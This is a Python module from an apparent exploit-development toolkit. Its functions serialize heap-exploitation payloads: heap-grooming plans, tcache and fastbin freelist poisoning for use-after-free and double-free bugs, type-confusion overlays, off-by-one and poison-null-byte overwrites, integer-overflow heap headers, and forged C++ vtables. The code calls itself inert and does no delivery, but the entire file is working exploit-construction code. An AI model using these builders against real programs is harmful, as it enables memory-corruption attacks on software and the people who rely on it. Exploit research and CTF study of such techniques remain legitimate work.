"""Offline heap-bug primitive and bounded grooming template builders.

The builders turn caller-supplied addresses and bug facts into inert bytes plus deterministic maps.
They never allocate target memory, launch a process, or deliver data.  UAF and double-free routes are
selected through :mod:`heap_version_matrix`, so allocator-version transitions stay centralized.
"""
from __future__ import annotations

import functools
import json
import struct
from dataclasses import dataclass
from typing import Iterable, Sequence

try:
    from .contract import BuildError, PayloadBuild, ensure_uint
    from . import heap_version_matrix as matrix
except ImportError:  # pragma: no cover - repository direct-import convention
    from contract import BuildError, PayloadBuild, ensure_uint
    import heap_version_matrix as matrix


MAX_OVERFLOW = 65536
MAX_GROOM_OPERATIONS = 128


class PrimitiveBuildError(BuildError):
    """A primitive description is unbounded or internally contradictory."""


def _wrap_primitive_errors(func):
    """Convert base or delegated validation errors to the declared primitive type.

    Entrypoints compose the shared contract (``BuildError`` from ``ensure_uint``)
    and the version matrix (``VersionMatrixError``).  A caller should only observe
    :class:`PrimitiveBuildError`, so any such error that is not already one is
    re-raised as one.  Valid inputs never reach this handler.
    """

    @functools.wraps(func)
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except PrimitiveBuildError:
            raise
        except BuildError as exc:
            raise PrimitiveBuildError(str(exc)) from exc

    return wrapper


@dataclass(frozen=True)
class GroomOperation:
    opcode: str
    slot: int
    size: int
    phase: str

    def as_dict(self) -> dict[str, object]:
        return {"opcode": self.opcode, "slot": self.slot, "size": self.size, "phase": self.phase}


def _chunk_size(value: int, bits: int = 64) -> int:
    if isinstance(bits, bool) or bits not in (32, 64):
        raise PrimitiveBuildError("bits must be 32 or 64")
    ensure_uint(value, bits, name="chunk_size")
    alignment = 16 if bits == 64 else 8
    minimum = 0x20 if bits == 64 else 0x10
    if value < minimum or value % alignment:
        raise PrimitiveBuildError(f"chunk_size must be >={minimum:#x} and {alignment:#x}-aligned")
    return value


def _json(value: object) -> str:
    return json.dumps(value, sort_keys=True, separators=(",", ":"))


def _annotate(
    build: PayloadBuild,
    *,
    primitive: str,
    operations: Sequence[GroomOperation | str],
    constraints: Sequence[str],
) -> PayloadBuild:
    rendered_ops = [item.as_dict() if isinstance(item, GroomOperation) else item for item in operations]
    metadata = dict(build.metadata)
    metadata.update({
        "primitive": primitive,
        "grooming": _json(rendered_ops),
        "constraints": _json(tuple(constraints)),
        "delivery": "none",
    })
    return PayloadBuild(
        payload=build.payload, placements=build.placements, widths=build.widths,
        architecture=build.architecture, strategy=f"{primitive}:{build.strategy}",
        base_address=build.base_address, metadata=metadata,
    )


@_wrap_primitive_errors
def plan_heap_groom(
    *, chunk_size: int, live_chunks: int = 4, holes: int = 2,
    guard_chunks: int = 2, refill: bool = True, max_operations: int = MAX_GROOM_OPERATIONS,
) -> tuple[GroomOperation, ...]:
    """Plan bounded alloc/free feng shui with guards and deterministic holes."""
    size = _chunk_size(chunk_size)
    for value, label in ((live_chunks, "live_chunks"), (holes, "holes"),
                         (guard_chunks, "guard_chunks"), (max_operations, "max_operations")):
        if isinstance(value, bool) or not isinstance(value, int) or value < 0:
            raise PrimitiveBuildError(f"{label} must be a non-negative integer")
    if not 1 <= live_chunks <= 64 or not 0 <= holes <= live_chunks or guard_chunks > 16:
        raise PrimitiveBuildError("groom counts exceed bounded limits")
    if not 1 <= max_operations <= MAX_GROOM_OPERATIONS:
        raise PrimitiveBuildError(f"max_operations must be 1..{MAX_GROOM_OPERATIONS}")
    operations: list[GroomOperation] = []
    total = live_chunks + 2 * guard_chunks
    for slot in range(total):
        phase = "left-guard" if slot < guard_chunks else (
            "right-guard" if slot >= guard_chunks + live_chunks else "layout"
        )
        operations.append(GroomOperation("alloc", slot, size, phase))
    if holes:
        # Spread holes across the live run without data-dependent searching.
        selected = sorted({guard_chunks + ((index * live_chunks) // holes)
                           for index in range(holes)})
        if len(selected) != holes:
            raise PrimitiveBuildError("hole selection collapsed; adjust live_chunks/holes")
        for slot in reversed(selected):
            operations.append(GroomOperation("free", slot, size, "make-hole"))
        if refill:
            for slot in selected:
                operations.append(GroomOperation("alloc", slot, size, "controlled-refill"))
    if len(operations) > max_operations:
        raise PrimitiveBuildError("groom plan exceeds max_operations")
    return tuple(operations)


@_wrap_primitive_errors
def build_heap_groom_plan(
    *, chunk_size: int, live_chunks: int = 4, holes: int = 2,
    guard_chunks: int = 2, refill: bool = True,
) -> PayloadBuild:
    """Serialize the bounded grooming plan as inert, version-independent bytecode."""
    operations = plan_heap_groom(
        chunk_size=chunk_size, live_chunks=live_chunks, holes=holes,
        guard_chunks=guard_chunks, refill=refill,
    )
    payload = bytearray(struct.pack("<4sHH", b"R5BG", 1, len(operations)))
    placements: dict[str, int] = {"header.magic": 0, "header.version": 4, "header.count": 6}
    widths: dict[str, int] = {"header.magic": 4, "header.version": 2, "header.count": 2}
    opcode = {"alloc": 1, "free": 2}
    for index, operation in enumerate(operations):
        offset = len(payload)
        phase_id = {"left-guard": 1, "right-guard": 2, "layout": 3,
                    "make-hole": 4, "controlled-refill": 5}[operation.phase]
        payload.extend(struct.pack("<BBHI", opcode[operation.opcode], phase_id,
                                   operation.slot, operation.size))
        label = f"operation[{index}]"
        placements[label] = offset
        widths[label] = 8
    return PayloadBuild(
        payload=bytes(payload), placements=placements, widths=widths,
        architecture="heap-plan", strategy="bounded-heap-feng-shui",
        metadata={"operations": _json([item.as_dict() for item in operations]),
                  "constraints": _json(("planner bytecode is descriptive and is never delivered",
                                        "caller maps slot numbers to its scoped allocator API"))},
    )


@_wrap_primitive_errors
def build_uaf_reuse(
    *, glibc_version: str, freed_chunk_addr: int, chunk_size: int,
    replacement_addr: int, bits: int = 64,
) -> PayloadBuild:
    """Select a tcache or fastbin freelist overwrite for a proven UAF write primitive."""
    profile = matrix.profile_for(glibc_version)
    size = _chunk_size(chunk_size, bits)
    if profile.tcache:
        base = matrix.build_versioned_tcache(
            action="poison", glibc_version=profile.version, chunk_addr=freed_chunk_addr,
            chunk_size=size, peer_or_target_addr=replacement_addr, bits=bits,
        )
        prefill = min(profile.tcache_count - 1, 6)
    else:
        base = matrix.build_versioned_fastbin(
            action="poison", glibc_version=profile.version, chunk_addr=freed_chunk_addr,
            chunk_size=size, peer_or_fake_addr=replacement_addr, bits=bits,
        )
        prefill = 0
    grooming = plan_heap_groom(chunk_size=size, live_chunks=max(4, prefill + 1), holes=1,
                               guard_chunks=1, refill=False)
    return _annotate(base, primitive="use-after-free-reuse", operations=grooming, constraints=(
        "the application must retain a write-capable reference after free",
        "replacement_addr and any fake header are supplied from offline target analysis",
        "no allocation or delivery is performed by this builder",
    ))


@_wrap_primitive_errors
def build_double_free(
    *, glibc_version: str, chunk_addr: int, guard_or_next_addr: int,
    chunk_size: int, bits: int = 64,
) -> PayloadBuild:
    """Select the version-correct tcache-key or fastbin A/B/A duplicate template."""
    profile = matrix.profile_for(glibc_version)
    size = _chunk_size(chunk_size, bits)
    if profile.tcache:
        base = matrix.build_versioned_tcache(
            action="dup", glibc_version=profile.version, chunk_addr=chunk_addr,
            chunk_size=size, peer_or_target_addr=guard_or_next_addr, bits=bits,
        )
    else:
        base = matrix.build_versioned_fastbin(
            action="dup", glibc_version=profile.version, chunk_addr=chunk_addr,
            chunk_size=size, peer_or_fake_addr=guard_or_next_addr, bits=bits,
        )
    grooming = plan_heap_groom(chunk_size=size, live_chunks=4, holes=2,
                               guard_chunks=1, refill=False)
    constraints = [
        "the same allocation must become freeable twice through a real application bug",
        "fastbin uses a distinct intervening head; tcache 2.29+ needs a key bypass",
    ]
    return _annotate(base, primitive="double-free", operations=grooming, constraints=constraints)


@_wrap_primitive_errors
def build_type_confusion(
    *, object_addr: int, type_tag: int, data_pointer: int, logical_length: int,
    call_pointer: int = 0, bits: int = 64,
) -> PayloadBuild:
    """Serialize a generic object overlay for pointer/length/call-slot confusion."""
    if isinstance(bits, bool) or bits not in (32, 64):
        raise PrimitiveBuildError("bits must be 32 or 64")
    width = bits // 8
    for value, name in ((object_addr, "object_addr"), (type_tag, "type_tag"),
                        (data_pointer, "data_pointer"), (logical_length, "logical_length"),
                        (call_pointer, "call_pointer")):
        ensure_uint(value, bits, name=name)
    if not object_addr or not data_pointer:
        raise PrimitiveBuildError("object_addr and data_pointer must be non-zero")
    values = (type_tag, data_pointer, logical_length, call_pointer)
    payload = b"".join(value.to_bytes(width, "little") for value in values)
    if object_addr + len(payload) > 1 << bits:
        raise PrimitiveBuildError("type-confusion object crosses the address space")
    labels = ("type_tag", "data_pointer", "logical_length", "call_pointer")
    placements = {label: index * width for index, label in enumerate(labels)}
    widths = {label: width for label in labels}
    return PayloadBuild(
        payload=payload, placements=placements, widths=widths,
        architecture="amd64" if bits == 64 else "i386", strategy="heap-type-confusion-overlay",
        base_address=object_addr,
        metadata={
            "constraints": _json((
                "field ordering must match the confused concrete type",
                "call_pointer is inert unless the target later dispatches through that field",
                "logical_length must be consistent with the intended read/write primitive",
            )),
            "address_map": _json({label: object_addr + offset for label, offset in placements.items()}),
            "delivery": "none",
        },
    )


@_wrap_primitive_errors
def build_off_by_one(
    *, buffer_addr: int, overwrite_offset: int, replacement_byte: int,
    fill_byte: int = 0x41,
) -> PayloadBuild:
    """Build a bounded exact-distance one-byte overwrite."""
    for value, name in ((buffer_addr, "buffer_addr"), (overwrite_offset, "overwrite_offset"),
                        (replacement_byte, "replacement_byte"), (fill_byte, "fill_byte")):
        if isinstance(value, bool) or not isinstance(value, int):
            raise PrimitiveBuildError(f"{name} must be an integer")
    if not 0 < buffer_addr < 1 << 64:
        raise PrimitiveBuildError("buffer_addr must be a non-zero 64-bit address")
    if not 0 <= overwrite_offset < MAX_OVERFLOW:
        raise PrimitiveBuildError(f"overwrite_offset must be 0..{MAX_OVERFLOW - 1}")
    if not 0 <= replacement_byte <= 0xFF or not 0 <= fill_byte <= 0xFF:
        raise PrimitiveBuildError("replacement_byte and fill_byte must be octets")
    payload = bytes((fill_byte,)) * overwrite_offset + bytes((replacement_byte,))
    if buffer_addr + len(payload) > 1 << 64:
        raise PrimitiveBuildError("off-by-one payload crosses the 64-bit address space")
    placements = {"off_by_one": overwrite_offset}
    widths = {"off_by_one": 1}
    if overwrite_offset:
        placements["controlled_prefix"] = 0
        widths["controlled_prefix"] = overwrite_offset
    return PayloadBuild(
        payload=payload,
        placements=placements,
        widths=widths,
        architecture="byte-stream", strategy="off-by-one",
        base_address=buffer_addr,
        metadata={
            "constraints": _json(("the vulnerable copy must write exactly payload length bytes",
                                  "replacement byte semantics depend on the adjacent target field")),
            "overwrite_address": hex(buffer_addr + overwrite_offset),
            "delivery": "none",
        },
    )


@_wrap_primitive_errors
def build_null_byte_poison(
    *, buffer_addr: int, victim_size_field_addr: int, original_size: int,
    fill_byte: int = 0x41,
) -> PayloadBuild:
    """Build a poison-null-byte size-LSB clear with before/after constraints."""
    ensure_uint(buffer_addr, 64, name="buffer_addr")
    ensure_uint(victim_size_field_addr, 64, name="victim_size_field_addr")
    ensure_uint(original_size, 64, name="original_size")
    if victim_size_field_addr < buffer_addr:
        raise PrimitiveBuildError("victim_size_field_addr must not precede buffer_addr")
    cleared = original_size & ~0xFF
    if cleared == original_size or cleared < 0x20 or cleared % 0x10:
        raise PrimitiveBuildError("clearing the size LSB must produce a smaller aligned chunk size")
    offset = victim_size_field_addr - buffer_addr
    base = build_off_by_one(
        buffer_addr=buffer_addr, overwrite_offset=offset,
        replacement_byte=0, fill_byte=fill_byte,
    )
    return _annotate(base, primitive="poison-null-byte", operations=(
        "fill the source buffer up to the adjacent victim size byte",
        "write the terminating NUL into the size-field least-significant byte",
        "exercise the target glibc consolidation path only after checking neighbor metadata",
    ), constraints=(
        f"modeled chunk size transition is {original_size:#x}->{cleared:#x}",
        "prev_size/PREV_INUSE and following-chunk checks remain target-specific",
    ))


@_wrap_primitive_errors
def build_integer_overflow_heap(
    *, header_addr: int, count: int, element_size: int, copy_count: int,
    integer_bits: int = 32,
) -> PayloadBuild:
    """Serialize count/allocation/copy facts for a proven multiplication-wrap heap bug."""
    if integer_bits not in (16, 32, 64):
        raise PrimitiveBuildError("integer_bits must be 16, 32, or 64")
    ensure_uint(header_addr, 64, name="header_addr")
    if not header_addr:
        raise PrimitiveBuildError("header_addr must be non-zero")
    maximum = (1 << integer_bits) - 1
    for value, name in ((count, "count"), (element_size, "element_size"),
                        (copy_count, "copy_count")):
        if isinstance(value, bool) or not isinstance(value, int) or not 0 < value <= maximum:
            raise PrimitiveBuildError(f"{name} must be in 1..{maximum}")
    mathematical = count * element_size
    wrapped = mathematical & maximum
    copy_bytes = copy_count * element_size
    if mathematical <= maximum:
        raise PrimitiveBuildError("count * element_size does not overflow the selected integer width")
    if wrapped == 0 or copy_bytes <= wrapped:
        raise PrimitiveBuildError("wrapped allocation must be non-zero and smaller than the modeled copy")
    width = integer_bits // 8
    values = (count, element_size, wrapped, copy_count)
    payload = b"".join(value.to_bytes(width, "little") for value in values)
    if header_addr + len(payload) > 1 << 64:
        raise PrimitiveBuildError("integer-overflow header crosses the 64-bit address space")
    labels = ("count", "element_size", "wrapped_allocation", "copy_count")
    placements = {label: index * width for index, label in enumerate(labels)}
    return PayloadBuild(
        payload=payload, placements=placements, widths={label: width for label in labels},
        architecture=f"uint{integer_bits}-heap-header", strategy="integer-overflow-to-heap",
        base_address=header_addr,
        metadata={
            "constraints": _json((
                "the allocation expression must truncate at the selected integer width",
                "the subsequent copy must use the untruncated or independently larger length",
            )),
            "mathematical_allocation": str(mathematical),
            "wrapped_allocation": str(wrapped),
            "copy_bytes": str(copy_bytes),
            "overflow_bytes": str(copy_bytes - wrapped),
            "delivery": "none",
        },
    )


@_wrap_primitive_errors
def build_cpp_vtable(
    *, object_addr: int, fake_vtable_addr: int, call_targets: Iterable[int],
    original_fields: bytes = b"", bits: int = 64,
) -> PayloadBuild:
    """Bundle a forged C++ object vptr and bounded fake-vtable entries."""
    if isinstance(bits, bool) or bits not in (32, 64):
        raise PrimitiveBuildError("bits must be 32 or 64")
    width = bits // 8
    ensure_uint(object_addr, bits, name="object_addr")
    ensure_uint(fake_vtable_addr, bits, name="fake_vtable_addr")
    if not object_addr or not fake_vtable_addr:
        raise PrimitiveBuildError("object_addr and fake_vtable_addr must be non-zero")
    try:
        targets = tuple(call_targets)
    except TypeError as exc:
        raise PrimitiveBuildError("call_targets must be iterable") from exc
    if not 1 <= len(targets) <= 32:
        raise PrimitiveBuildError("call_targets must contain 1..32 entries")
    for index, target in enumerate(targets):
        ensure_uint(target, bits, name=f"call_targets[{index}]")
        if not target:
            raise PrimitiveBuildError("call targets must be non-zero")
    if not isinstance(original_fields, bytes) or len(original_fields) > 4096:
        raise PrimitiveBuildError("original_fields must be bounded immutable bytes")
    object_blob = fake_vtable_addr.to_bytes(width, "little") + original_fields
    object_end = object_addr + len(object_blob)
    table_end = fake_vtable_addr + len(targets) * width
    if object_end > 1 << bits or table_end > 1 << bits:
        raise PrimitiveBuildError("C++ object or fake vtable crosses the address space")
    if object_addr < table_end and fake_vtable_addr < object_end:
        raise PrimitiveBuildError("C++ object and fake-vtable target ranges overlap")
    padding = (-len(object_blob)) % width
    table_offset = len(object_blob) + padding
    payload = object_blob + bytes(padding) + b"".join(
        target.to_bytes(width, "little") for target in targets
    )
    placements = {"object.vptr": 0, "object.fields": width, "fake_vtable": table_offset}
    widths = {"object.vptr": width, "fake_vtable": len(targets) * width}
    if original_fields:
        widths["object.fields"] = len(original_fields)
    else:
        placements.pop("object.fields")
    for index in range(len(targets)):
        placements[f"fake_vtable.entry[{index}]"] = table_offset + index * width
        widths[f"fake_vtable.entry[{index}]"] = width
    address_map = {"object.vptr": object_addr, "fake_vtable": fake_vtable_addr}
    address_map.update({f"fake_vtable.entry[{index}]": fake_vtable_addr + index * width
                        for index in range(len(targets))})
    return PayloadBuild(
        payload=payload, placements=placements, widths=widths,
        architecture="amd64-cxx" if bits == 64 else "i386-cxx", strategy="cpp-vtable-confusion",
        metadata={
            "address_map": _json(address_map),
            "constraints": _json((
                "the object vptr must be overwriteable and later used by a virtual dispatch",
                "ABI slot selection and this-pointer adjustment must match the target call site",
                "CFI/CET/PAC constraints are not bypassed by serialization alone",
            )),
            "object_address": hex(object_addr),
            "fake_vtable_address": hex(fake_vtable_addr),
            "delivery": "none",
        },
    )


__all__ = [
    "GroomOperation", "MAX_GROOM_OPERATIONS", "MAX_OVERFLOW", "PrimitiveBuildError",
    "plan_heap_groom", "build_heap_groom_plan", "build_uaf_reuse", "build_double_free",
    "build_type_confusion", "build_off_by_one", "build_null_byte_poison",
    "build_integer_overflow_heap", "build_cpp_vtable",
]
